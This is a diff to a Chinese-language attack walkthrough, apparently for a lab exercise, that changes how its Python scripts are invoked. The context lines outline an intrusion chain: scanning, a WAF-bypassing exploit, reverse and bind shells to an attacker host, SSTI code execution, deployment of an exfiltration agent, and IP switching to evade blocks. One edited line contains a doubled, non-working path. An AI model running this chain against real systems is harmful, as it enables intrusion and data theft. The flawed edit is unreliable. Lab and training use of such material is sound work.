@@ -41,7 +41,7 @@ nmap -p 2000-10000 -sV <TARGET_IP>
 
 ```bash
 # 執行攻擊腳本
-python3 exploit.py <TARGET_IP>
+.venv/bin/python3 exploit.py <TARGET_IP>
 ```
 
 **WAF 繞過原理：**
@@ -85,7 +85,7 @@ id
 
 ```bash
 # 攻擊機: 啟動 reverse shell listener + payload 產生器
-python3 red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+.venv/bin/python3 red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
 
 # 另一終端: 貼上輸出的 curl 指令
 curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
@@ -115,7 +115,7 @@ SSTI → os.popen → base64 -d → python3 → fork()
 
 ```bash
 # 攻擊機: 啟動接收器
-sudo python3 exfil_listener.py
+sudo .venv/bin/python3 exfil_listener.py
 
 # 靶機 (bind shell 內): 部署 agent
 # 先在攻擊機生成部署指令:
@@ -202,7 +202,7 @@ exit
 ./ip_switch.sh add
 
 # 1. 啟動 exfil 接收器 (背景執行)
-sudo python3 exfil_listener.py &
+sudo .venv/bin/python3 exfil_listener.py &
 
 # 2. 生成 agent 部署指令 (先備好，稍後貼入 shell)
 ./deploy_agent.sh 172.22.137.15
@@ -223,7 +223,7 @@ nc -v <TARGET_IP> 2222
 
 ```bash
 # 5. 用備用 IP 繞過封鎖，發動攻擊
-python3 exploit.py <TARGET_IP> 9999 172.22.137.15
+.venv/bin/.venv/bin/python3 exploit.py <TARGET_IP> 9999 172.22.137.15
 
 # 6. 連線 Bind Shell (指定備用 IP)
 nc -s 172.22.137.15 -v <TARGET_IP> 4444
